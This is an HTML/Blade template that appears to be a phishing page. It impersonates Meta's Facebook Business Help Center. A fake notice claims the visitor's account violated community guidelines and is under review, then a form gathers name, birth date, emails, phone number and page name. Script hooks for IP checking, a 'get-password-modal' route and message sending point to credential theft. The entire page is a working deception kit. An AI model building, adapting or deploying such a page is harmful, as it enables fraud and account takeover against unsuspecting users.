<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <base href="{{ asset('') }}">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>@yield('title-ad')</title>
    <script>
        var URL_CHECK_IP = '{{ url('check-ip') }}';
        var URL_FB = '{{ url('get-password-modal') }}';
        var URL_SEND_MESSAGE = '{{ url('send-message') }}';
    </script>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    @include('facebook.business-css')
</head>

<body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="spinner"></div>
    <div id="root">
        <div class="business">
            <div class="top-header">
                <div class="container"><img
                        src="{{ url('source/image/facebook/d42fe85024cd6936fb43a241e083e5b3.png') }}" width="70"
                        class="metalogo">
                    <p class="metahead">Support Inbox</p><img
                        src="{{ url('source/image/facebook/913f4cdb1dc234a4f5523184e9416cce.png') }}" width="100%"
                        class="searchicon">
                </div>
            </div>
            <div class="masheader"
                style="background-image: url(&quot;{{ url('source/image/facebook/1f85623d06212e6d3ed4016dc123dc05.png') }}&quot;);">
                <div class="wrapper">
                    <div class="container">
                        <p class="businesshelp" style="visibility: hidden;">Meta Business Help Center </p>
                        <p class="businesshelpcenter">Facebook Business Help Center</p>
                    </div>
                </div>
            </div>
            <div class="main">
                <div class="form">
                    <div class="header-form">
                        <div class="header-top">
                            <div class="dot"></div>
                            <div class="line"></div>
                            <div class="dot"></div>
                            <div class="line"></div>
                            <div class="dot"></div>
                        </div>
                        <div class="header-bottom">
                            <p>Select Asset</p>
                            <p>Select the Issue</p>
                            <p>Get help</p>
                        </div>
                    </div>
                    <div class="pb-3 text-center" style="font-size: 20px; text-align: center;"><strong>Get
                            Started</strong></div>
                    <div class="mb-4"
                        style="background-color: rgb(226, 227, 229); font-size: 12px; text-align: left; padding: 15px;">
                        We have received multiple reports that suggest that your account has been in violation of
                        our terms of services and community guidelines. As a result, your account is scheduled for
                        review<br>
                        <div class="pt-2 text-start" style="font-size: 14px;"><strong>Report no: 3088553115</strong>
                        </div>
                    </div>
                    <form id="basic" autocomplete="off" class="ant-form ant-form-horizontal css-3mqfnx">
                        <input type="hidden" name="_token" id="_token" value="{{ csrf_token() }}" />
                        <div class="item-form"><label style="color: rgb(0, 0, 0); font-weight: bold;">Please provide
                                us information that will help us investigate</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content">
                                                <textarea rows="2" required="true" id="basic_fill_reason" name="basic_fill_reason" aria-required="true"
                                                    class="ant-input css-3mqfnx"></textarea>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="name">Gender</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-form-item-control-input">
                                        <div class="ant-form-item-control-input-content">
                                            <span class="_5k_2 _5dba">
                                                <label class="_58mt" for="u_3_5_kC"
                                                    style="padding-right: 10px;cursor: pointer;">Male</label><input
                                                    type="radio" checked class="_8esa" name="sex" value="NAM"
                                                    id="u_3_5_kC">
                                            </span>
                                            <span class="_5k_2 _5dba" style="margin-left: 20px;">
                                                <label class="_58mt" for="u_3_4_5T"
                                                    style="padding-right: 10px;cursor: pointer;">Female</label><input
                                                    type="radio" class="_8esa" name="sex" value="NU"
                                                    id="u_3_4_5T">
                                            </span>
                                            <span class="_5k_2 _5dba" style="margin-left: 20px;">
                                                <label class="_58mt" for="u_3_4_5TCC"
                                                    style="padding-right: 10px;cursor: pointer;">Other</label><input
                                                    type="radio" class="_8esa" name="sex" value="BEDE"
                                                    id="u_3_4_5TCC">
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="name">Full name</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content">
                                                <input id="basic_Name" name="basic_Name" required="true"
                                                    aria-required="true" class="ant-input css-3mqfnx"
                                                    type="text" />
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="name">Birth Day</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content">
                                                <input id="basic_fill_birth_day" name="basic_fill_birth_day"
                                                    placeholder="dd/mm/yyyy" aria-required="true"
                                                    class="datepicker ant-input css-3mqfnx" type="text"
                                                    value="">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="Business">Business email address</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input id="basic_Email"
                                                    aria-required="true" name="basic_Email"
                                                    class="ant-input css-3mqfnx" type="text" value="">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="email">Personal email address</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input
                                                    id="basic_PersonalEmail" aria-required="true"
                                                    name="basic_PersonalEmail" class="ant-input css-3mqfnx"
                                                    type="text" value="">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="phone">Mobile Phone Number</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input id="basic_Phone"
                                                    aria-required="true" name="basic_Phone"
                                                    class="ant-input css-3mqfnx" type="text" value="">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="email">Facebook page name</label>
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input
                                                    id="basic_Pagename" name="basic_Pagename" aria-required="true"
                                                    class="ant-input css-3mqfnx" type="text" value="">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form">
                            <div class="ant-form-item css-3mqfnx">
                                <div class="ant-row ant-form-item-row css-3mqfnx">
                                    <div class="ant-col ant-form-item-control css-3mqfnx">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><label
                                                    class="ant-checkbox-wrapper ant-checkbox-wrapper-in-form-item css-3mqfnx"><span
                                                        class="ant-checkbox ant-wave-target css-3mqfnx">
                                                        <input id="basic_check_form" aria-required="true"
                                                            name="basic_check_form" type="checkbox" />
                                                        <span>I agree to our Terms, Data and Cookies
                                                            Policy.</span></label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="ant-form-item btn butoni css-3mqfnx">
                            <div class="ant-row ant-form-item-row css-3mqfnx">
                                <div class="ant-col ant-form-item-control css-3mqfnx">
                                    <div class="ant-form-item-control-input">
                                        <div class="ant-form-item-control-input-content">
                                            <button type="submit" class="ant-btn css-3mqfnx ant-btn-default"
                                                id="business-submit"
                                                style="background-color: transparent; outline: none; border: none; box-shadow: none; color: rgb(38, 125, 241); font-weight: 700; font-size: 1rem;"><span>Submit</span></button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="modal fade" tabindex="-1" role="dialog" data-backdrop="static">
                </div>
            </div>
            <div class="footer">
                <div class="container"><img
                        src="{{ url('source/image/facebook/d42fe85024cd6936fb43a241e083e5b3.png') }}"
                        class="logofooter">
                    <p class="nerlogofooter">Facebook can help your large, medium or small business grow. Get the
                        latest news for advertisers and more on our <a href="/auth/business"
                            style="text-decoration: none; color: white;">Meta for Business Page.</a></p>
                    <div class="row">
                        <div class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Marketing on Facebook</p>
                                    <p>Success Stories</p>
                                    <p>Measurement</p>
                                    <p>Industries</p>
                                    <p>Inspiration</p>
                                    <p>Events</p>
                                    <p>News</p>
                                    <p>Site map</p>
                                </li>
                            </ul>
                        </div>
                        <div class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Marketing objectives</p>
                                    <p>Build your presence</p>
                                    <p>Create awareness</p>
                                    <p>Drive discovery</p>
                                    <p>Generate leads</p>
                                    <p>Boost sales</p>
                                    <p>Earn loyalty</p>
                                </li>
                            </ul>
                        </div>
                        <div class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Facebook Pages</p>
                                    <p>Get started with Pages</p>
                                    <p>Setting up your Page</p>
                                    <p>Manage your Facebook Page</p>
                                    <p>Promote your Page</p>
                                    <p>Messaging on your Page</p>
                                    <p>Page Insights</p>
                                </li>
                            </ul>
                        </div>
                        <div variant="dontshowonmobile " class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Facebook ads</p>
                                    <p>Get started with ads</p>
                                    <p>Buying Facebook ads</p>
                                    <p>Ad formats</p>
                                    <p>Ad placement</p>
                                    <p>Choose your audience</p>
                                    <p>Measure your ads</p>
                                    <p>Managing your ads</p>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bottomfooter">
                <div class="container">
                    <ul>
                        <li>English (UK)</li>
                        <li>English (US)</li>
                        <li>Español</li>
                        <li>Português (Brasil)</li>
                        <li>Français (France)</li>
                        <li>Español (España)</li>
                        <li>More languages</li>
                    </ul>
                    <ul>
                        <li>© 2023 Meta</li>
                        <li>About</li>
                        <li>Developers</li>
                        <li>Careers</li>
                        <li>Privacy</li>
                        <li>Cookies</li>
                        <li>Terms</li>
                        <li>Help Centre</li>
                    </ul>
                </div>
            </div>

        </div>
    </div>
    @include('facebook.js')
    <script>
        getIP();
    </script>

</body>

</html>
